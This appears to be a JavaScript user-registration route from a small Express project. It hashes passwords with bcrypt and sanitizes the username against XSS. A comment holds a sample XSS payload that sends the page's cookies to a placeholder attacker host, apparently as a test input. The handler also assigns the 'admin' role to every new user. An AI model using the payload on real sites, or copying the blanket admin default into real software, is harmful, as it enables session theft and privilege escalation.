import {v4} from 'uuid';
import bcrypt from 'bcrypt';
import query from '../database.js';
import xss from 'xss';

/* Test attaque XSS
{
    "pseudo": "<script language='javascript'>window.location('http://hackeur.com/?cookie' + document.cookie)</script>",
    "password": "glubibulga"
}
*/

export default (req, res) => {
    bcrypt.hash(req.body.password, 10, (error, hash) => {
        if (error) {
            console.error(error);
            res.status(500).json({
              error: 'Erreur serveur'
            });
            return;
        }
        
        const user = {
            id: v4(),
            pseudo: xss(req.body.pseudo),
            password: hash,
            role: 'admin'
        }
        query(
            'INSERT INTO User (id, pseudo, password, role) VALUES (?, ?, ?, ?)',
            [user.id, user.pseudo, user.password, user.role],
            (error, result) => {
                if(error) {
                    console.error(error);
                    res.status(500).json({
                        error: 'Erreur server'
                    });
                    return;
                }
                
                res.status(201).json({
                    data: {
                        id: user.id,
                        pseudo: user.pseudo,
                        role: user.role
                    }
                });
            }
        );
    });
}
